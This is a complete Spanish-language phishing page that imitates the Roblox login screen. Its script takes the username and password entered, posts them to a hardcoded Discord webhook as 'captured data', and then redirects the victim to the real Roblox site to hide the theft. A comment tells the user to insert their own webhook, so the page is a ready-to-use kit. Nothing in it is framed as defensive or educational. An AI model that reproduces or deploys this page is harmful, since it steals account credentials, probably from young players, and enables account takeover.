<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inicia sesión - Roblox</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
            width: 350px;
            text-align: center;
        }
        .login-box img {
            width: 120px;
            margin-bottom: 20px;
        }
        .login-box h2 {
            color: #333;
            margin-bottom: 30px;
            font-size: 24px;
        }
        .login-box input {
            width: 100%;
            padding: 12px 15px;
            margin: 10px 0;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            outline: none;
            transition: 0.3s;
        }
        .login-box input:focus {
            border-color: #00a2ff;
        }
        .login-box button {
            width: 100%;
            padding: 12px;
            background: #00a2ff;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            transition: 0.3s;
        }
        .login-box button:hover {
            background: #0088cc;
        }
        .login-box p {
            margin-top: 20px;
            color: #666;
            font-size: 14px;
        }
        .login-box a {
            color: #00a2ff;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_Logo_2022.svg/1200px-Roblox_Logo_2022.svg.png" alt="Roblox">
        <h2>Inicia sesión</h2>
        
        <form id="loginForm">
            <input type="text" id="username" placeholder="Nombre de usuario" required>
            <input type="password" id="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
        
        <p>¿No tienes cuenta? <a href="#">Regístrate</a></p>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // ⚠️ CAMBIA ESTO POR TU WEBHOOK DE DISCORD ⚠️
            const webhookURL = 'https://discord.com/api/webhooks/1515896077298040985/h3KDNg45cyvURVTuwyt8tpDfIDawPGYn9FvxUFFwBC6idwosoMYu4UW1JpeWabfC_pXF';
            
            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `**🎯 Nuevos datos capturados:**\n👤 **Usuario:** ${username}\n🔑 **Contraseña:** ${password}\n🕐 **Hora:** ${new Date().toLocaleString()}`
                })
            })
            .then(response => {
                if(response.ok) {
                    console.log('Datos enviados correctamente');
                }
            })
            .catch(error => {
                console.error('Error al enviar:', error);
            });
            
            window.location.href = 'https://www.roblox.com';
        });
    </script>
</body>
</html>
